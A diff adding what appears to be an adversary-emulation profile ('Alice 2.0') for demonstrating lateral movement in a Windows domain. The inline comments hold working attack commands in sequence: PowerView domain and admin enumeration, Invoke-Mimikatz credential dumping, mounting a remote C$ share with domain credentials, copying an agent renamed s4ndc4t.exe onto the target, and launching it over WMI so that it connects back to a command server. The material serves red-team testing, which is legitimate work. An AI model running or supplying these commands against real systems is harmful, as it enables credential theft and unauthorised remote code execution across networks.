@@ -1,0 +1,17 @@
+---
+
+id: 50855e29-3b4e-4562-aa55-b3d7f93c26b8
+name: Alice 2.0
+description: Adversary used for demoing restricted lateral movement
+atomic_ordering:
+  - 13379ae1-d20e-4162-91f8-320d78a35e7f # Powerview:Get-DomainComputer     :   Import-Module .\\powerview.ps1;\nGet-DomainComputer\n
+  - 7049e3ec-b822-4fdf-a4ac-18190f9b66d1 # Invoke-Mimikatz                  :   Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n
+  - 14a21534-350f-4d83-9dd7-3c56b93a0c17 # nbtstat                          :   nbtstat -n\n
+  - 6d90e6fa-9324-4eb5-93be-9f737245bd7z # get-netlocalgroup/admins         :   Import-Module .\\powerview.ps1;\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn}\n
+  - 2afae782-6d0a-4fbd-a6b6-d1ce90090eac # get-netlocalgroup/admins         :   Import-Module .\\powerview.ps1;\n$backup = "#{backup.admin.ability}";\n$userName = "#{domain.user.name}";\n$userPassword = "#{domain.user.password}";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n
+                                         # using Credential-Object (backup) 
+  - 921055f4-5970-4707-909e-62f594234d91 # ping to check firewall           :   ping #{remote.host.fqdn}\n
+  - aa6ec4dd-db09-4925-b9b9-43adeb154686 # Net user                         :   net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n
+  - 65048ec1-f7ca-49d3-9410-10813e472b30 # SMB Copy                         :   $path = "sandcat.go-windows";\n$drive = "\\\\#{remote.host.fqdn}\\C$";\nCopy-Item -v -Path $path -Destination $drive"\\Users\\Public\\s4ndc4t.exe";\n
+  - ece5dde3-d370-4c20-b213-a1f424aa8d03 # WMI exec                         :   wmic /node:`"#{remote.host.fqdn}`" /user:`"#{domain.user.name}`" /password:`"#{domain.user.password}`" process call create "powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}";\n
+
